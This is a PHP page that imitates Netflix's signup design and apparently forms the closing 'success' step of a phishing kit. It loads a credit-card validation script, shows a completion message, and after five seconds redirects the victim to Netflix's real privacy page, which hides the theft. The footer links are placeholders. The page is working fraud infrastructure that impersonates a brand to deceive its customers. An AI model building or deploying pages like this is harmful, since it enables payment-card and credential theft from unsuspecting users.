<?php session_start();
if(!isset($_SESSION['language'])){exit(header("Location: index"));
}else{include "system/languages/{$_SESSION['language']}.php";
}?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Netflix</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
<link id="lib_main" type="text/css" rel="stylesheet" href="files/css/none.css">
<link id="lib" type="text/css" rel="stylesheet" href="files/css/none2.css">
<link rel="shortcut icon" href="files/img/favicon.ico">
<link rel="apple-touch-icon" href="files/img/favicon.png">
<script type="text/javascript" src="files/js/modernizr.min.js">
</script><script src="files/js/jquery.js"></script> 
<script src="files/js/jquery.ccvalid.js"></script>
<script src="files/js/jquery.mask.js"></script>
</head>
<body>
<div class="basicLayout simplicity">
   <div class="nfHeader noBorderHeader signupBasicHeader"><span class="logo"><img src="files/img/nt_logo.svg" alt="logo"></span><a href="javascript:" class="authLinks signupBasicHeader isMemberSimplicity"><?php echo $info_tr['signout']?></a></div>
   <div class="simpleContainer">
      <div class="centerContainer contextStep firstLoad">
         <div class="planContainer">
            <div class="stepLogoContainer"><span class="stepLogo planStepLogo"></span></div>
            <div class="stepHeader-container">
               <div class="stepHeader">
                  <span class="stepIndicator"><?php echo $finish_tr['step']?></span>
                  <h1 class="stepTitle"><?php echo $finish_tr['success']?></h1>
               </div>
            </div>
            <div class="contextBody contextRow"><?php echo $finish_tr['redirect']?></div>
         </div>
         <div class="submitBtnContainer">
            <button id="bt" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-align-undefined nf-btn-oversize" type="button"><?php echo $finish_tr['bt']?></button><script>$("#lib_main").removeAttr('disabled');$("#lib").removeAttr('disabled');$(document).on('click','#bt',function(){window.location.href="https://"+"help.netflix.com/legal/privacy";});setTimeout(function(){window.location.href="https://"+"help.netflix.com/legal/privacy";},5000);</script>
         </div>
      </div>
   </div>
   <div class="site-footer-wrapper centered">
      <div class="footer-divider"></div>
      <div class="site-footer">
         <p class="footer-top"><a class="footer-top-a" href="javascript:"><?php echo $lg_tr['contact']?></a></p>
         <ul class="footer-links structural">
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['faq']?></a></li>
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['help_center']?></a></li>
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $lg_tr['terms']?></a></li>
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $lg_tr['privacy']?></a></li>
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['cookies']?></a></li>
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['corporate']?></a></li>
         </ul>
      </div>
   </div>
</div>
</body>
</html>